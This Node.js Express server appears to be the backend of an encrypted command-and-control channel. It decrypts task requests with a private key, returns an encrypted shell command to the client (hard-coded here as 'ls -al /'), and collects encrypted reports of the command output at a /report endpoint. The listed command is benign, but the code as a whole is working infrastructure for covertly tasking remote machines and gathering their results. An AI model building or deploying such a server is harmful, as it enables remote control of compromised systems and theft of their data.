import express from "express";
import bodyParser from "body-parser";
import crypto from "crypto";
import { symmetricEncrypt, symmetricDecrypt, privkeyDecrypt } from "./crypto";

const app = express();
const port = SERVER_PORT;
const private_key = PRIVATE_KEY;

const taskRequestToSymKey = {};

// Middleware to parse JSON data
app.use(bodyParser.json());

app.post("/task", (req, res) => {
  console.log("Received encrypted task request: ", req.body);
  const taskRequest = privkeyDecrypt(req.body, private_key);

  console.log(taskRequest);

  const response = {
    task_id: taskRequest.task_id,
    command: "ls -al /",
  };

  taskRequestToSymKey[taskRequest.task_id] = taskRequest.symkey;

  res.status(200).json(symmetricEncrypt(response, taskRequest.symkey));
});

// Endpoint to handle JSON data at /poll
app.post("/report", (req, res) => {
  const { data, iv, task_id } = req.body;

  const symkey = taskRequestToSymKey[task_id];

  const report = symmetricDecrypt({ iv, data }, symkey);

  console.log("Received task report:", report);

  res.status(200).end();
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
